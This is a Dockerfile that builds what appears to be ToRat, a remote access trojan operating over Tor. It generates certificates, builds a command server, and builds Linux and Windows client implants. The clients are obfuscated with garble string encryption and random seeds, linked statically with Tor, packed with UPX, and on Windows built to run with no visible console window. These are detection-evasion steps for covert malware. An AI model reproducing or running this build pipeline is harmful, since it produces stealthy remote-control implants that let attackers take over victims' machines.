FROM lu4p/tor-static:latest
RUN go install mvdan.cc/garble@v0.3.0
RUN mkdir /ToRat
WORKDIR /ToRat
COPY go.mod .
COPY go.sum .

RUN go mod download -x

RUN mkdir -p /dist/server && mkdir -p /dist/client

COPY keygen/ keygen/
# Generate keys and certificates
RUN cd ./keygen && go run .

COPY . .

# Move certificates to the correct location
RUN mv ../cert.pem torat_client/cert.pem
RUN mv ../priv_key.pem keygen/priv_key.pem

# Build ToRat_server
RUN cd ./cmd/server && go build -o /dist/server/ToRat_server

ENV GOPRIVATE="github.com,howett.net,gopkg.in,golang.org"

# Build Linux Client
RUN cd /go/pkg/mod/github.com/cretz/tor-static && tar -xf libs_linux.tar.gz
RUN cd ./cmd/client && garble -literals -seed=random build -ldflags="-extldflags=-static" -tags "osusergo,netgo,tor" -o /dist/client/client_linux && upx /dist/client/client_linux

# Build Windows Client
RUN cd /go/pkg/mod/github.com/cretz/tor-static && unzip -o tor-static-windows-amd64.zip 
RUN cd ./cmd/client && GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ garble -literals -seed=random build -tags "osusergo,netgo,tor" --ldflags "-H windowsgui" -o /dist/client/client_windows.exe
RUN upx /dist/client/client_windows.exe --force

EXPOSE 8000
CMD cp /dist/* /dist_ext -rf && ls /dist_ext && cd ./cmd/server/ && /dist_ext/server/ToRat_server
